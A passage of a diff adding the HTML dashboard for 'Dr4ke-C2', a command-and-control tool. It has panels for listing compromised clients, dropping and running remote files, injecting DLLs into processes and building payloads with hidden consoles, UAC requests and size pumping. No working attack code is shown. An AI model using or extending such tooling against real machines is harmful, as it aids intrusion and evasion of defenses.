@@ -1,0 +1,2375 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Command & Control Dashboard">
+    <title>Dr4ke-C2 - Command & Control</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text x='50' y='78' font-family='Arial Black' font-size='85' fill='%23dc2626' text-anchor='middle' font-weight='900'>D</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #555 #2c2c2c;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #2c2c2c;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #555;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #777;
+        }
+
+        body {
+            background-color: #1e1e1e;
+            color: #d1d5db;
+            font-family: "Roboto Mono", monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        #main-content {
+            height: calc(100vh - 50px);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            padding: 0.3rem;
+        }
+
+        #main-content>section,
+        #console-section,
+        #process-injection-section,
+        #fileexec-section,
+        #eventlogs-section {
+            padding: 0.3rem;
+            margin: 0.3rem;
+        }
+
+        #interaction-area {
+            gap: 0.3rem;
+            margin-top: 0.3rem;
+            flex: 1;
+            min-height: 300px;
+            overflow: hidden;
+        }
+
+        .space-y-4 {
+            --tw-space-y-reverse: 0;
+            margin-top: calc(0.3rem * calc(1 - var(--tw-space-y-reverse)));
+            margin-bottom: calc(0.3rem * var(--tw-space-y-reverse));
+        }
+
+        #clients-section {
+            min-height: 150px;
+            max-height: 80vh;
+            resize: vertical;
+            overflow: hidden;
+            position: relative;
+            border-bottom: 3px solid #475569;
+            cursor: ns-resize;
+        }
+
+        #clients-table-container {
+            height: calc(100% - 40px);
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+
+        #clients-section::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(to right, #475569, #64748b, #475569);
+            cursor: ns-resize;
+        }
+
+        #clients-section:hover::after {
+            background: linear-gradient(to right, #3b82f6, #60a5fa, #3b82f6);
+        }
+
+        .clients-section {
+            max-height: 200px;
+        }
+
+        .client-row td {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.75rem;
+            line-height: 1.2;
+        }
+
+        .clients-section thead th {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.7rem;
+        }
+
+        .clients-section .overflow-y-auto {
+            max-height: 150px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+        }
+
+        .status-badge {
+            padding: 0.125rem 0.375rem;
+            font-size: 0.6rem;
+        }
+
+        #process-injection-section {
+            height: auto;
+        }
+
+        #console-section {
+            height: auto;
+            flex: 1;
+        }
+
+        #eventlogs-section {
+            height: auto;
+            flex: 0.8;
+        }
+
+        #console-output {
+            position: relative;
+            background: #1a1a1a;
+            padding: 0.3rem;
+            height: calc(100% - 80px);
+            overflow-y: auto;
+        }
+
+        #console-output::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 360px;
+            height: 360px;
+            transform: translate(-50%, -50%);
+            background-image: url('https://i.imgur.com/54nSux6.png');
+            background-size: 360px 360px;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.3;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        #console-output>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        #fileexec-section {
+            height: auto;
+        }
+
+        .drop-zone {
+            border: 2px dashed #555;
+            border-radius: 4px;
+            padding: 1rem;
+            text-align: center;
+            transition: background 0.2s;
+        }
+
+        .drop-zone.dragover {
+            background: #2c2c2c;
+        }
+
+        @media (max-height: 768px) {
+
+            #console-section,
+            #fileexec-section {
+                height: calc(100vh - 150px);
+            }
+        }
+
+        @media (min-height: 1080px) {
+
+            #console-section,
+            #fileexec-section {
+                height: calc(100vh - 250px);
+            }
+        }
+
+        .eventlogs-highlight {
+            background-color: #ffd700 !important;
+            color: #000 !important;
+            padding: 1px 2px;
+            border-radius: 2px;
+        }
+
+        #eventlogs-zoom-in,
+        #eventlogs-zoom-out {
+            transition: all 0.2s ease;
+        }
+
+        #eventlogs-zoom-in:hover,
+        #eventlogs-zoom-out:hover {
+            transform: scale(1.1);
+        }
+
+        #eventlogs-search {
+            transition: all 0.2s ease;
+        }
+
+        #eventlogs-search:focus {
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+            outline: none;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+    <header class="flex items-center justify-between bg-[#252526] p-2">
+        <div class="flex items-center space-x-3">
+            <i class="fas fa-dragon text-lg text-red-600"></i>
+            <h1 class="text-sm font-semibold text-slate-200">Dr4ke-C2</h1>
+            <button id="payload-builder-btn"
+                class="flex items-center px-2 py-1 text-xs bg-slate-700 text-slate-300 rounded-sm hover:bg-slate-600">
+                <i class="fas fa-hammer mr-1"></i> Payload Builder
+            </button>
+            <button id="event-logs-btn"
+                class="flex items-center px-2 py-1 text-xs bg-slate-700 text-slate-300 rounded-sm hover:bg-slate-600">
+                <i class="fas fa-list-alt mr-1"></i> Event Logs
+            </button>
+            <button id="file-exec-btn"
+                class="flex items-center px-2 py-1 text-xs bg-slate-700 text-slate-300 rounded-sm hover:bg-slate-600">
+                <i class="fas fa-folder-open mr-1"></i> File Execution
+            </button>
+            <button id="process-injection-btn"
+                class="flex items-center px-2 py-1 text-xs bg-slate-700 text-slate-300 rounded-sm hover:bg-slate-600">
+                <i class="fas fa-syringe mr-1"></i> Process Injection
+            </button>
+        </div>
+        <div class="flex items-center space-x-2">
+            <button id="about-btn" class="text-slate-400 hover:text-white text-xs" title="About">
+                <i class="fas fa-info-circle"></i>
+            </button>
+            <button id="logout-btn" class="text-slate-400 hover:text-white text-xs" title="Logout">
+                <i class="fas fa-sign-out-alt"></i>
+            </button>
+        </div>
+    </header>
+
+    <div id="main-content" class="flex-grow p-4 space-y-4">
+        <section id="clients-section" class="bg-[#252526] border border-slate-700 rounded-sm p-3 clients-section">
+            <div class="flex items-center justify-between mb-2">
+                <h2 class="text-xs text-slate-200 uppercase font-mono">Clients</h2>
+                <div class="space-x-2">
+                    <button id="tab-all" class="px-2 py-0.5 text-[10px] bg-blue-600 text-white rounded-sm">All</button>
+                    <button id="tab-active"
+                        class="px-2 py-0.5 text-[10px] bg-slate-700 text-slate-400 rounded-sm">Active</button>
+                    <button id="tab-idle"
+                        class="px-2 py-0.5 text-[10px] bg-slate-700 text-slate-400 rounded-sm">Idle</button>
+                    <button id="tab-dead"
+                        class="px-2 py-0.5 text-[10px] bg-slate-700 text-slate-400 rounded-sm">Dead</button>
+                </div>
+            </div>
+
+            <div id="clients-table-container">
+                <table class="w-full text-xs font-mono text-slate-300">
+                    <thead class="sticky top-0 bg-[#252526] z-10">
+                        <tr>
+                            <th class="px-2 py-1 text-left">ID</th>
+                            <th class="px-2 py-1 text-left">First seen</th>
+                            <th class="px-2 py-1 text-left">Last seen</th>
+                            <th class="px-2 py-1 text-left">Status</th>
+                            <th class="px-2 py-1 text-left">Process</th>
+                            <th class="px-2 py-1 text-left">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="client-list"></tbody>
+                </table>
+            </div>
+
+            <div class="resize-handle"
+                style="position: absolute; bottom: 0; left: 0; right: 0; height: 3px; cursor: ns-resize; background: transparent;">
+            </div>
+        </section>
+
+        <div id="interaction-area" class="flex space-x-4">
+            <section id="fileexec-section"
+                class="hidden bg-[#252526] border border-slate-700 rounded-sm flex flex-col w-1/3 h-64">
+                <div class="flex items-center justify-between px-3 py-1 border-b border-slate-700">
+                    <span class="text-[10px] text-slate-400 uppercase font-mono">File Execution</span>
+                    <button id="close-fileexec-btn" class="text-slate-400 hover:text-white text-xs">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+
+                <div
+                    class="flex-1 p-3 overflow-y-auto font-mono text-[10px] text-slate-300 bg-[#1a1a1a] flex flex-col justify-between">
+                    <div class="space-y-3">
+                        <div class="space-y-2">
+                            <label for="fileUrl"
+                                class="block text-xs font-medium text-gray-300 flex items-center space-x-2">
+                                <i class="fas fa-link text-gray-400"></i>
+                                <span>File URL</span>
+                            </label>
+                            <div class="relative">
+                                <input type="text" id="fileUrl"
+                                    class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                    placeholder="Enter file URL..." autocomplete="off">
+                                <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                    <i class="fas fa-globe text-gray-500 text-xs"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label for="fileType"
+                                class="block text-xs font-medium text-gray-300 flex items-center space-x-2">
+                                <i class="fas fa-file-code text-gray-400"></i>
+                                <span>File Type</span>
+                            </label>
+                            <div class="relative">
+                                <select id="fileType"
+                                    class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300 appearance-none">
+                                    <option value="bat">Batch Script (.bat)</option>
+                                </select>
+                                <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                    <i class="fas fa-code text-gray-500 text-xs"></i>
+                                </div>
+                                <div class="absolute inset-y-0 right-0 pr-2 flex items-center pointer-events-none">
+                                    <i class="fas fa-chevron-down text-gray-500 text-xs"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label for="dropLocation"
+                                class="block text-xs font-medium text-gray-300 flex items-center space-x-2">
+                                <i class="fas fa-folder-open text-gray-400"></i>
+                                <span>Drop Location</span>
+                                <span class="text-xs text-gray-500">(optional)</span>
+                            </label>
+                            <div class="relative">
+                                <input type="text" id="dropLocation"
+                                    class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                    placeholder="%TEMP% or custom path..." autocomplete="off">
+                                <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                    <i class="fas fa-folder text-gray-500 text-xs"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="flex items-center space-x-2 py-2">
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" id="executeInMemory" class="sr-only peer">
+                                <div
+                                    class="w-9 h-5 bg-gray-700 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-primary/50 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-primary">
+                                </div>
+                                <span class="ms-2 text-xs font-medium text-gray-300 flex items-center space-x-1">
+                                    <i class="fas fa-memory text-gray-400 text-xs"></i>
+                                    <span>Execute in Memory</span>
+                                    <span class="text-xs text-gray-500">(when possible)</span>
+                                </span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="flex space-x-2 pt-4 mt-auto">
+                        <button id="executeFileBtn"
+                            class="flex-1 bg-primary hover:bg-primary/90 text-white rounded-lg px-3 py-2 flex items-center justify-center space-x-1 transition-all duration-300 shadow-lg shadow-primary/20 hover:shadow-primary/30 text-xs">
+                            <i class="fas fa-play text-xs"></i>
+                            <span>Execute</span>
+                        </button>
+                        <button id="dropFileBtn"
+                            class="flex-1 bg-gray-700 hover:bg-gray-600 text-white rounded-lg px-3 py-2 flex items-center justify-center space-x-1 transition-all duration-300 text-xs">
+                            <i class="fas fa-download text-xs"></i>
+                            <span>Drop & Run</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <section id="process-injection-section"
+                class="hidden bg-[#252526] border border-slate-700 rounded-sm flex flex-col w-1/3">
+                <div class="flex items-center justify-between px-3 py-1 border-b border-slate-700">
+                    <span class="text-[10px] text-slate-400 uppercase font-mono">Process Injection</span>
+                    <button id="close-process-injection-btn" class="text-slate-400 hover:text-white text-xs">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+
+                <div class="flex-1 p-3 overflow-y-auto font-mono text-[10px] text-slate-300 bg-[#1a1a1a] flex flex-col">
+                    <div class="mb-3 p-2 bg-slate-800 rounded border border-slate-600">
+                        <div class="flex items-center justify-between mb-1">
+                            <div class="flex items-center space-x-2">
+                                <i class="fas fa-bullseye text-red-400 text-xs"></i>
+                                <span class="text-xs text-slate-300 font-medium">Target Client</span>
+                            </div>
+                            <button id="detect-client-btn" class="text-slate-400 hover:text-blue-400 text-xs"
+                                title="Detect Selected Client" onclick="testDetectClient()">
+                                <i class="fas fa-search"></i>
+                            </button>
+                        </div>
+                        <div id="injection-target-info" class="text-xs text-slate-400">
+                            No client selected
+                        </div>
+                    </div>
+
+                    <div class="space-y-2 flex-1">
+                        <div class="flex items-center justify-between">
+                            <label class="block text-xs font-medium text-gray-300 flex items-center space-x-2">
+                                <i class="fas fa-list text-gray-400"></i>
+                                <span>Running Processes</span>
+                            </label>
+                            <button id="refresh-processes-btn" class="text-slate-400 hover:text-blue-400 text-xs"
+                                title="Refresh Process List" onclick="testRefreshProcesses()">
+                                <i class="fas fa-sync-alt"></i>
+                            </button>
+                        </div>
+
+                        <div class="relative">
+                            <input type="text" id="process-search"
+                                class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                placeholder="Search processes..." autocomplete="off">
+                            <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                <i class="fas fa-search text-gray-500 text-xs"></i>
+                            </div>
+                        </div>
+
+                        <div id="process-list-container"
+                            class="bg-slate-900 border border-slate-700 rounded p-2 h-40 overflow-y-auto">
+                            <div class="text-xs text-slate-500 text-center py-4">
+                                <i class="fas fa-spinner fa-spin mb-2"></i><br>
+                                Click "Refresh" to load processes
+                            </div>
+                        </div>
+
+                        <div id="selected-process-info" class="hidden p-2 bg-slate-800 rounded border border-slate-600">
+                            <div class="flex items-center space-x-2 mb-1">
+                                <i class="fas fa-crosshairs text-blue-400 text-xs"></i>
+                                <span class="text-xs text-slate-300 font-medium">Selected Process</span>
+                            </div>
+                            <div id="selected-process-details" class="text-xs text-slate-400">
+                            </div>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label class="block text-xs font-medium text-gray-300 flex items-center space-x-2">
+                                <i class="fas fa-file-code text-gray-400"></i>
+                                <span>DLL to Inject</span>
+                            </label>
+
+                            <div class="space-y-2">
+                                <div class="flex space-x-1">
+                                    <button id="dll-method-local"
+                                        class="flex-1 px-2 py-1 text-xs bg-blue-600 text-white rounded-sm">Local
+                                        File</button>
+                                    <button id="dll-method-url"
+                                        class="flex-1 px-2 py-1 text-xs bg-slate-700 text-slate-400 rounded-sm">URL</button>
+                                </div>
+
+                                <div id="dll-local-input">
+                                    <div class="relative">
+                                        <input type="text" id="dll-filename"
+                                            class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                            placeholder="filename.dll" autocomplete="off">
+                                        <div
+                                            class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                            <i class="fas fa-file text-gray-500 text-xs"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div id="dll-url-input" class="hidden">
+                                    <div class="relative">
+                                        <input type="text" id="dll-url"
+                                            class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-8 pr-4 py-2 text-xs focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                            placeholder="https://example.com/payload.dll" autocomplete="off">
+                                        <div
+                                            class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+                                            <i class="fas fa-link text-gray-500 text-xs"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="flex space-x-2 pt-3 mt-auto border-t border-slate-700">
+                        <button id="inject-dll-btn"
+                            class="flex-1 bg-red-600 hover:bg-red-500 text-white rounded-lg px-3 py-2 flex items-center justify-center space-x-1 transition-all duration-300 text-xs disabled:opacity-50 disabled:cursor-not-allowed"
+                            disabled>
+                            <i class="fas fa-syringe text-xs"></i>
+                            <span>Inject DLL</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <section id="eventlogs-section"
+                class="hidden bg-[#252526] border border-slate-700 rounded-sm flex flex-col w-1/3">
+                <div class="flex items-center justify-between px-3 py-1 border-b border-slate-700">
+                    <div class="flex items-center space-x-2">
+                        <span class="text-[10px] text-slate-400 uppercase font-mono">Event Logs</span>
+                        <button id="clear-eventlogs-btn" class="text-slate-400 hover:text-blue-400 text-xs"
+                            title="Clear Logs">
+                            <i class="fas fa-eraser"></i>
+                        </button>
+                        <div class="flex items-center space-x-1 ml-2">
+                            <button id="eventlogs-zoom-out" class="text-slate-400 hover:text-blue-400 text-xs"
+                                title="Zoom Out"
+                                onclick="console.log('Zoom Out clicked directly'); window.testZoomOut && window.testZoomOut();">
+                                <i class="fas fa-search-minus"></i>
+                            </button>
+                            <button id="eventlogs-zoom-in" class="text-slate-400 hover:text-blue-400 text-xs"
+                                title="Zoom In"
+                                onclick="console.log('Zoom In clicked directly'); window.testZoomIn && window.testZoomIn();">
+                                <i class="fas fa-search-plus"></i>
+                            </button>
+                            <span id="eventlogs-zoom-level"
+                                class="text-[9px] text-slate-500 min-w-[24px] text-center">100%</span>
+                        </div>
+                    </div>
+                    <div class="flex items-center space-x-2">
+                        <div class="relative">
+                            <input type="text" id="eventlogs-search" placeholder="Search..."
+                                class="bg-[#1a1a1a] border border-slate-600 text-slate-300 text-xs px-2 py-1 pr-16 rounded-sm font-mono w-32">
+                            <span id="eventlogs-search-count"
+                                class="absolute right-2 top-1/2 transform -translate-y-1/2 text-[9px] text-slate-500"></span>
+                        </div>
+                        <button id="close-eventlogs-btn" class="text-slate-400 hover:text-white text-xs">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="flex-1 p-3 overflow-y-auto font-mono text-slate-300 bg-[#1a1a1a] flex flex-col"
+                    id="eventlogs-container">
+                    <div class="flex items-center justify-between mb-2">
+                        <div class="flex items-center space-x-2">
+                            <i class="fas fa-circle text-green-400 text-[6px]"></i>
+                            <span class="text-xs text-slate-400">Server Activity</span>
+                        </div>
+                    </div>
+
+                    <div id="event-logs-output" class="flex-1 overflow-y-auto space-y-1 min-h-0"
+                        style="font-size: 10px;">
+                        <div class="text-slate-500 text-[9px] select-none">
+                            <span class="text-blue-400">[INFO]</span> Event monitoring started...
+                        </div>
+                        <div class="text-slate-500 text-[9px] select-none">
+                            <span class="text-green-400">[READY]</span> Waiting for server events...
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <div id="aboutModal"
+                class="fixed inset-0 flex items-center justify-center z-50 hidden transition-all duration-300 pointer-events-none">
+                <div class="relative w-full max-w-xl transform transition-all duration-300 pointer-events-auto">
+                    <div class="bg-[#252526] rounded-sm border border-slate-700 shadow-2xl overflow-hidden">
+                        <div class="bg-[#1e1e1e] px-4 py-2 flex items-center justify-between border-b border-slate-700">
+                            <h3 class="text-sm font-medium text-slate-200">About</h3>
+                            <button id="about-close" class="text-slate-400 hover:text-white transition-colors">
+                                <i class="fas fa-times text-sm"></i>
+                            </button>
+                        </div>
+
+                        <div class="p-4 flex">
+
+                            <div class="flex-shrink-0 mr-4">
+                                <div
+                                    class="w-20 h-20 bg-gradient-to-br from-red-600 via-red-700 to-red-800 rounded flex items-center justify-center shadow-lg">
+                                    <i class="fas fa-dragon text-3xl text-white"></i>
+                                </div>
+                            </div>
+
+                            <div class="flex-1 space-y-2">
+                                <div>
+                                    <h2 class="text-lg font-bold text-slate-200 leading-tight">Dr4ke-C2 (1.0)</h2>
+                                    <p class="text-slate-400 text-xs">A simple Command and Control center for testing
+                                        managed machines.</p>
+                                </div>
+
+                                <div class="text-xs text-slate-300 space-y-0.5">
+                                    <p><span class="text-slate-500">©</span> 2025 Dr4ke</p>
+                                    <p><span class="text-slate-500">Release:</span> June 2025</p>
+                                    <p><span class="text-slate-500">Build:</span> 2025</p>
+                                </div>
+
+                                <div class="border-t border-slate-700 pt-2">
+                                    <p class="text-slate-300 text-xs leading-relaxed">
+                                        Dr4ke-C2 is proudly developed and actively maintained by <span
+                                            class="text-blue-400">Vithor</span> as an independent <span
+                                            class="text-blue-400">open source cybersecurity project</span>.
+                                    </p>
+
+                                </div>
+
+                                <div class="border-t border-slate-700 pt-2">
+                                    <h4 class="text-slate-200 font-medium text-xs mb-1">Third Party Acknowledgements
+                                    </h4>
+                                    <p class="text-slate-400 text-xs mb-1">
+                                        Dr4ke Commander makes use of code and/or content from the following sources:
+                                    </p>
+                                    <div class="text-xs text-slate-500 leading-tight">
+                                        <p>Go 1.21.2 (GCC 7.3.1 20180303), 64 bit</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="payload-builder-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center">
+                <div class="bg-[#252526] rounded-sm p-6 max-w-2xl w-full mx-4 border border-slate-700 shadow-2xl">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-lg font-semibold text-slate-200 flex items-center">
+                            <i class="fas fa-hammer mr-2 text-slate-400"></i>
+                            Payload Builder
+                        </h2>
+                        <button id="close-payload-builder-modal" class="text-slate-400 hover:text-slate-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-semibold text-slate-300 border-b border-slate-700 pb-2">Build
+                                Configuration</h3>
+
+                            <div>
+                                <label class="block text-xs font-medium text-slate-400 mb-1">Server URL</label>
+                                <input type="text" id="payload-server-url"
+                                    class="w-full px-3 py-2 bg-[#1e1e1e] border border-slate-700 rounded-sm text-slate-200 text-sm focus:border-slate-500 focus:outline-none"
+                                    placeholder="http://localhost:8080" value="http://localhost:8080">
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-medium text-slate-400 mb-1">Output Name</label>
+                                <input type="text" id="payload-output-name"
+                                    class="w-full px-3 py-2 bg-[#1e1e1e] border border-slate-700 rounded-sm text-slate-200 text-sm focus:border-slate-500 focus:outline-none"
+                                    placeholder="client" value="client">
+                            </div>
+
+                            <div class="space-y-3">
+                                <h4 class="text-xs font-semibold text-slate-400">Build Options</h4>
+
+                                <div>
+                                    <label class="block text-xs font-medium text-slate-400 mb-2">Output Format</label>
+                                    <div class="flex space-x-4">
+                                        <label class="flex items-center space-x-2 cursor-pointer">
+                                            <input type="radio" name="payload-format" id="payload-format-exe"
+                                                value="exe"
+                                                class="form-radio h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 focus:ring-slate-500"
+                                                checked>
+                                            <span class="text-sm text-slate-300">Executable (.exe)</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2 cursor-pointer">
+                                            <input type="radio" name="payload-format" id="payload-format-dll"
+                                                value="dll"
+                                                class="form-radio h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 focus:ring-slate-500">
+                                            <span class="text-sm text-slate-300">Library (.dll)</span>
+                                        </label>
+                                    </div>
+                                </div>
+
+                                <label class="flex items-center space-x-2 cursor-pointer" id="payload-debug-option">
+                                    <input type="checkbox" id="payload-debug-mode"
+                                        class="form-checkbox h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 rounded focus:ring-slate-500">
+                                    <span class="text-sm text-slate-300">Debug Mode</span>
+                                    <span class="text-xs text-slate-500 ml-auto">Shows console output</span>
+                                </label>
+
+                                <label class="flex items-center space-x-2 cursor-pointer" id="payload-console-option">
+                                    <input type="checkbox" id="payload-hide-console"
+                                        class="form-checkbox h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 rounded focus:ring-slate-500"
+                                        checked>
+                                    <span class="text-sm text-slate-300">Hide Console</span>
+                                    <span class="text-xs text-slate-500 ml-auto">Windows clients only</span>
+                                </label>
+
+                                <label class="flex items-center space-x-2 cursor-pointer" id="payload-uac-option">
+                                    <input type="checkbox" id="payload-request-uac"
+                                        class="form-checkbox h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 rounded focus:ring-slate-500">
+                                    <span class="text-sm text-slate-300">Request UAC</span>
+                                    <span class="text-xs text-slate-500 ml-auto">Admin privileges (Windows)</span>
+                                </label>
+
+                                <label class="flex items-center space-x-2 cursor-pointer" id="payload-strip-option">
+                                    <input type="checkbox" id="payload-strip-debug"
+                                        class="form-checkbox h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 rounded focus:ring-slate-500">
+                                    <span class="text-sm text-slate-300">Strip Debug Info</span>
+                                    <span class="text-xs text-slate-500 ml-auto">Reduce binary size</span>
+                                </label>
+                            </div>
+
+                            <div class="space-y-2">
+                                <label class="flex items-center space-x-2 cursor-pointer">
+                                    <input type="checkbox" id="payload-file-pumper"
+                                        class="form-checkbox h-4 w-4 text-slate-500 bg-[#1e1e1e] border-slate-700 rounded focus:ring-slate-500">
+                                    <span class="text-sm text-slate-300">File Pumper</span>
+                                    <span class="text-xs text-slate-500 ml-auto">Increase file size</span>
+                                </label>
+                                <div id="pumper-options" class="ml-6 space-y-2 hidden">
+                                    <div class="flex space-x-2">
+                                        <input type="number" id="pumper-size" min="1" max="1000" value="10"
+                                            class="w-20 px-2 py-1 bg-[#1e1e1e] border border-slate-700 rounded-sm text-slate-200 text-sm focus:border-slate-500 focus:outline-none">
+                                        <select id="pumper-unit"
+                                            class="px-2 py-1 bg-[#1e1e1e] border border-slate-700 rounded-sm text-slate-200 text-sm focus:border-slate-500 focus:outline-none">
+                                            <option value="KB">KB</option>
+                                            <option value="MB" selected>MB</option>
+                                            <option value="GB">GB</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <button id="build-payload-btn"
+                                class="w-full px-4 py-2 bg-slate-700 hover:bg-slate-600 text-slate-200 font-medium rounded-sm transition-colors flex items-center justify-center space-x-2">
+                                <i class="fas fa-cogs"></i>
+                                <span>Build Payload</span>
+                            </button>
+                        </div>
+
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-semibold text-slate-300 border-b border-slate-600 pb-2">Build Output
+                            </h3>
+
+                            <div id="build-output"
+                                class="bg-slate-900 border border-slate-700 rounded p-3 h-80 overflow-y-auto">
+                                <div class="text-xs text-slate-400 font-mono">
+                                    <div class="text-green-400">Dr4ke-C2 Payload Builder v1.0</div>
+                                    <div class="text-slate-500">Ready to build...</div>
+                                    <div class="mt-2">
+                                        <span class="text-blue-400">$</span> <span class="text-slate-300">Waiting for
+                                            build command...</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="download-section" class="hidden space-y-2">
+                                <div class="flex items-center p-3 bg-slate-700 rounded border border-slate-600">
+                                    <div class="flex items-center space-x-2">
+                                        <i class="fas fa-file-code text-green-400"></i>
+                                        <span class="text-sm text-slate-200"
+                                            id="download-filename">dr4ke-client.exe</span>
+                                        <span class="text-xs text-slate-400" id="download-size">2.1 MB</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="uploadModal"
+                class="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 hidden transition-all duration-300">
+                <div class="relative w-full max-w-lg transform transition-all duration-300">
+                    <div
+                        class="bg-gray-800/50 backdrop-blur-sm rounded-xl border border-gray-700/50 shadow-lg p-6 w-full">
+                        <div class="flex items-center justify-between mb-6">
+                            <div class="flex items-center space-x-3">
+                                <div class="p-2 bg-primary/10 rounded-lg">
+                                    <i class="fas fa-cloud-upload-alt text-primary text-xl"></i>
+                                </div>
+                                <h3 class="text-lg font-semibold text-gray-200">Upload File</h3>
+                            </div>
+                            <button id="file-upload-close" class="text-gray-400 hover:text-white transition-colors">
+                                <i class="fas fa-times text-lg"></i>
+                            </button>
+                        </div>
+
+                        <div id="drop-zone"
+                            class="border-2 border-dashed border-gray-600 bg-gray-900/30 rounded-xl p-8 mb-6 text-center cursor-pointer transition-all duration-300 hover:border-primary hover:bg-primary/5 group">
+                            <i
+                                class="fas fa-cloud-upload-alt text-5xl text-gray-400 mb-4 group-hover:text-primary transition-colors"></i>
+                            <p class="text-gray-300 font-medium mb-2 text-lg">Drag and drop a file here, or click to
+                                browse</p>
+                            <p class="text-sm text-gray-500">Any file type supported • Max size 100MB</p>
+                        </div>
+
+                        <div class="space-y-5">
+                            <div class="space-y-2">
+                                <label class="flex items-center space-x-2 text-sm font-medium text-gray-300">
+                                    <i class="fas fa-file-code text-gray-400"></i>
+                                    <span>Selected File</span>
+                                </label>
+                                <input type="file" id="file-upload-input" class="hidden" accept=".bat">
+                                <div class="relative">
+                                    <input type="text" id="selected-file-display"
